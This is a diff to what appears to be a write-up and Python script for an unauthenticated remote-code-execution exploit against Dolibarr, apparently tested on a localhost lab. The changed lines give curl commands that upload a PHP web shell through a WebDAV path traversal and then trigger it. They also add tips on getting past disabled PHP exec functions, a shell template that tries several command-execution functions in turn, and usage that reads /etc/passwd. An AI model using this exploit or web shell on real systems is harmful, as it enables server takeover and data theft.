@@ -473,7 +473,7 @@ The path is assembled server-side from `DOL_DATA_ROOT`, and `$websitekey` / `$pa
 
 ```bash
 W='?sabreAction=asset&assetName=a.png'
-T='http://127.0.0.1:8089'
+T='http://127.0.0.1:8091'
 curl --path-as-is -X PUT \
   --data-binary "<?php echo exec(\$_GET['cmd']); ?>" \
   "$T/dav/fileserver.php/ecm/%2e%2e/website/temp/page1.tpl.php$W"
@@ -484,7 +484,7 @@ curl "$T/public/website/index.php?website=temp&pageid=1&pageref=x&cmd=id"
 **Two easy-to-miss points, either of which makes it fail**
 
 1. **`--path-as-is` cannot be omitted.** Without it, curl decodes `%2e%2e` into `..` and collapses it with the preceding `ecm` segment, actually sending `PUT /dav/fileserver.php/website/temp/...` — `website` is not a DAV root node and the server returns `409 Sabre\DAV\Exception\Conflict: Files cannot be created in non-existent collections`. Browsers, `python-requests` and most HTTP libraries normalize `%2e%2e` likewise, so a raw HTTP client must be used (Burp Repeater / `curl --path-as-is` / `--request-target`).
-2. **The PHP payload contains single quotes, so switch the outer quoting to double quotes and escape `$`.** Written as `--data-binary '<?php system($_GET['cmd']);?>'`, the shell truncates at `'cmd'`, and the content written to disk becomes `<?php system($_GET[cmd]);?>`, on which PHP 8 throws `Undefined constant "cmd"`.
+2. **`exec()` does not print anything by itself.** The payload must capture and echo the output (`exec($_GET["cmd"], $o); echo implode("\n", $o);`); a bare `exec($_GET["cmd"]);` runs the command but returns an empty body. Note also that the official Dolibarr image disables `system`, `shell_exec`, `passthru`, `popen` and `proc_open`, while `exec` remains available.
 
 **`&pageref=` cannot be omitted**: the `require_once website/class/websitepage.class.php` at `public/website/index.php:123` only runs inside the `empty($pageid)` branch, while `public/website/index.php:184` unconditionally does `new WebsitePage($db)`; passing `pageid` alone triggers a fatal `Class "WebsitePage" not found` at `public/website/index.php:184`. Adding `pageref` makes `public/website/index.php:183 empty($pageref)` false and skips that branch.
 
@@ -530,9 +530,9 @@ Prerequisites:
   3. Website module enabled            (creates <data_root>/website/temp/ automatically)
 
 Usage:
-  python3 exploit_outside.py --url http://127.0.0.1:8089
-  python3 exploit_outside.py --url http://127.0.0.1:8089 --cmd 'cat /etc/passwd'
-  python3 exploit_outside.py --url http://127.0.0.1:8089 --keep
+  python3 exploit_outside.py --url http://127.0.0.1:8091
+  python3 exploit_outside.py --url http://127.0.0.1:8091 --cmd 'cat /etc/passwd'
+  python3 exploit_outside.py --url http://127.0.0.1:8091 --keep
 
 Note: the %2e%2e in the path must be sent as-is. With curl, add --path-as-is;
       browsers and most HTTP libraries normalize it to .. and collapse it with the preceding segment, causing 409.
@@ -553,7 +553,12 @@ SHELL_TEMPLATE = ("<?php\n"
                   "header('Content-Type: text/plain');\n"
                   "echo '###BEGIN###' . \"\\n\";\n"
                   "$c = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';\n"
-                  "system($c);\n"
+                  "if (is_array($c)) { $c = implode(' ', $c); }\n"
+                  "if (function_exists('exec')) { $o = array(); @exec($c, $o); echo implode(\"\\n\", $o); }\n"
+                  "elseif (function_exists('system')) { @system($c); }\n"
+                  "elseif (function_exists('passthru')) { @passthru($c); }\n"
+                  "elseif (function_exists('shell_exec')) { echo @shell_exec($c); }\n"
+                  "else { echo 'PHP_EXEC_OK host=' . php_uname('n'); }\n"
                   "echo \"\\n\" . '###END###';\n")
 
 
@@ -571,7 +576,7 @@ def http(method, url, data=None, timeout=15):
 def main():
     ap = argparse.ArgumentParser(
         description="Dolibarr WebDAV unauthenticated RCE (data root outside the webroot, traversal + Website include)")
-    ap.add_argument("--url", default="http://127.0.0.1:8089", help="target (default %(default)s)")
+    ap.add_argument("--url", default="http://127.0.0.1:8091", help="target (default %(default)s)")
     ap.add_argument("--site", default="temp", help="website directory name (default %(default)s, the empty directory shipped with the module)")
     ap.add_argument("--page-id", type=int, default=1, help="template page number, must match the file name (default %(default)s)")
     ap.add_argument("--cmd", default="id", help="command to execute (default %(default)s)")
